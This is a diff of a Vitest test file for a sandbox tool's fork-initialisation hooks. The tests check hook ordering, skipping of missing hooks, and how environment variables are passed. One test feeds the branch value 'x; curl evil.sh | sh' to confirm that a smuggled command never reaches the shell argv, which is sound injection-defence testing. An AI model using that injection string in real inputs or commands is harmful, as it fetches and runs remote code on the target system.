@@ -4,7 +4,7 @@ import path from 'node:path';
 
 import { afterEach, beforeEach, describe, expect, it } from 'vitest';
 
-import { type VMExec, runInitPipeline } from './run-init.js';
+import { type VMExec, runForkInitHooks, runInitPipeline } from './run-init.js';
 
 interface RecordedCall {
   kind: 'push' | 'run';
@@ -14,6 +14,8 @@ interface RecordedCall {
   user?: 'root' | 'default' | undefined;
   /** run only */
   cwd?: string | undefined;
+  /** run only */
+  env?: Record<string, string> | undefined;
 }
 
 function makeFakeExec(): {
@@ -30,8 +32,8 @@ function makeFakeExec(): {
       calls.push({ kind: 'push', arg: `file ${localFile} -> ${vmAbsPath}` });
       return Promise.resolve();
     },
-    run: ({ user, argv, cwd }) => {
-      calls.push({ kind: 'run', arg: argv.join(' '), user, cwd });
+    run: ({ user, argv, cwd, env }) => {
+      calls.push({ kind: 'run', arg: argv.join(' '), user, cwd, env });
       return Promise.resolve();
     },
   };
@@ -362,5 +364,132 @@ describe('runInitPipeline', () => {
 
     // Only the first run was attempted; cleanup wasn't reached.
     expect(runCount).toBe(1);
+  });
+});
+
+describe('runForkInitHooks', () => {
+  let workdir: string;
+
+  beforeEach(async () => {
+    workdir = await fs.mkdtemp(path.join(os.tmpdir(), 'aurica-fork-test-'));
+  });
+
+  afterEach(async () => {
+    await fs.rm(workdir, { recursive: true, force: true });
+  });
+
+  const baseOpts = {
+    user: 'sandbox',
+    forkName: 'proj-fork-1',
+    primaryName: 'proj',
+    branch: 'feature-x',
+    concurrencyIndex: 2,
+  };
+
+  it('does nothing when both hook dirs are null', async () => {
+    const { exec, calls } = makeFakeExec();
+    await runForkInitHooks(exec, {
+      ...baseOpts,
+      userInitDir: null,
+      projectInitDir: null,
+    });
+    // Only the best-effort staging cleanup runs.
+    const runs = calls.filter((c) => c.kind === 'run');
+    expect(runs).toHaveLength(1);
+    expect(runs[0]?.arg).toBe('rm -rf /home/sandbox/.aurica-init-staging');
+  });
+
+  it('skips a layer whose dir lacks setup-fork.sh', async () => {
+    const dir = path.join(workdir, 'no-fork-hook');
+    await fs.mkdir(dir);
+    await fs.writeFile(path.join(dir, 'setup-user.sh'), '#!/bin/bash\n:');
+
+    const { exec, calls } = makeFakeExec();
+    await runForkInitHooks(exec, {
+      ...baseOpts,
+      userInitDir: dir,
+      projectInitDir: null,
+    });
+    expect(calls.some((c) => c.arg.includes('setup-fork.sh'))).toBe(false);
+  });
+
+  it('runs setup-fork.sh for user then project layer in order', async () => {
+    const userDir = path.join(workdir, 'user-fork');
+    const projectDir = path.join(workdir, 'project-fork');
+    await fs.mkdir(userDir);
+    await fs.mkdir(projectDir);
+    await fs.writeFile(path.join(userDir, 'setup-fork.sh'), '#!/bin/bash\n:');
+    await fs.writeFile(
+      path.join(projectDir, 'setup-fork.sh'),
+      '#!/bin/bash\n:',
+    );
+
+    const { exec, calls } = makeFakeExec();
+    await runForkInitHooks(exec, {
+      ...baseOpts,
+      userInitDir: userDir,
+      projectInitDir: projectDir,
+    });
+
+    const hookRuns = calls
+      .filter((c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'))
+      .map((c) => c.arg);
+    expect(hookRuns).toEqual([
+      'bash -l /home/sandbox/.aurica-init-staging/user-fork/setup-fork.sh',
+      'bash -l /home/sandbox/.aurica-init-staging/project-fork/setup-fork.sh',
+    ]);
+  });
+
+  it('injects fork env via the run env channel, not a shell prefix', async () => {
+    const dir = path.join(workdir, 'env-fork');
+    await fs.mkdir(dir);
+    await fs.writeFile(path.join(dir, 'setup-fork.sh'), '#!/bin/bash\n:');
+
+    const { exec, calls } = makeFakeExec();
+    await runForkInitHooks(exec, {
+      ...baseOpts,
+      userInitDir: dir,
+      projectInitDir: null,
+    });
+
+    const hook = calls.find(
+      (c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'),
+    );
+    if (!hook) throw new Error('expected setup-fork.sh run');
+    expect(hook.user).toBe('default');
+    // argv is the bare script invocation — no `bash -c`, no `K=V` prefix.
+    expect(hook.arg).toBe(
+      'bash -l /home/sandbox/.aurica-init-staging/user-fork/setup-fork.sh',
+    );
+    expect(hook.env).toEqual({
+      FORK_NAME: 'proj-fork-1',
+      PRIMARY_NAME: 'proj',
+      FORK_BRANCH: 'feature-x',
+      CONCURRENCY_INDEX: '2',
+    });
+  });
+
+  it('does not let a malicious branch value escape into a shell command', async () => {
+    const dir = path.join(workdir, 'inject-fork');
+    await fs.mkdir(dir);
+    await fs.writeFile(path.join(dir, 'setup-fork.sh'), '#!/bin/bash\n:');
+
+    const { exec, calls } = makeFakeExec();
+    await runForkInitHooks(exec, {
+      ...baseOpts,
+      branch: 'x; curl evil.sh | sh',
+      userInitDir: dir,
+      projectInitDir: null,
+    });
+
+    const hook = calls.find(
+      (c) => c.kind === 'run' && c.arg.includes('setup-fork.sh'),
+    );
+    if (!hook) throw new Error('expected setup-fork.sh run');
+    // The malicious value stays confined to the env value — never the argv,
+    // which is passed token-by-token to execa with no shell.
+    expect(hook.arg).not.toContain('curl');
+    expect(hook.arg).not.toContain(';');
+    expect(hook.env?.FORK_BRANCH).toBe('x; curl evil.sh | sh');
   });
 });
